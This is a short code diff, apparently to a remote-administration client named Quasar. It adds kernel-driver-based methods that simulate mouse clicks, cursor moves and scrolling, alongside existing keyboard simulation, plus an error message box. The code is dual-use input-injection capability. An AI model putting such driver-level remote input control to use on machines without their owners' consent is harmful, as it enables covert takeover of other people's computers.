@@ -158,6 +158,7 @@ namespace Quasar.Client.Interception
                     keyboardHook = new KeyboardHook(null);
                     return true;
                 }
+                MessageBox.Show("driver initialization failed.");
             }
             else MessageBox.Show("driver is not installed");
             return false;
@@ -596,6 +597,35 @@ namespace Quasar.Client.Interception
             ConvertKeycodeToInterceptionKeys(keyCode, keyDown).Deconstruct(out keys, out state);
             if (keyDown) InterceptionHelper.keyboardHook.SimulateKeyDown((InputInterceptorNS.KeyCode)keys);
             else InterceptionHelper.keyboardHook.SimulateKeyUp((InputInterceptorNS.KeyCode)keys);
+        }
+
+        public static bool KernelDoMouseLeftClick(Point p, bool isMouseDown)
+        {
+            if (isMouseDown)
+                return InterceptionHelper.mouseHook.SimulateLeftButtonDown();
+            else
+                return InterceptionHelper.mouseHook.SimulateLeftButtonUp();
+        }
+
+        public static bool KernelDoMouseRightClick(Point p, bool isMouseDown)
+        {
+            if (isMouseDown)
+                return InterceptionHelper.mouseHook.SimulateRightButtonDown();
+            else
+                return InterceptionHelper.mouseHook.SimulateRightButtonUp();
+        }
+
+        public static bool KernelDoMouseMove(Point p)
+        {
+            return InterceptionHelper.mouseHook.SetCursorPosition(p.X, p.Y);
+        }
+
+        public static bool KernelDoMouseScroll(Point p, bool scrollDown)
+        {
+            if (scrollDown)
+                return InterceptionHelper.mouseHook.SimulateScrollDown();
+            else
+                return InterceptionHelper.mouseHook.SimulateScrollUp();
         }
     }
 
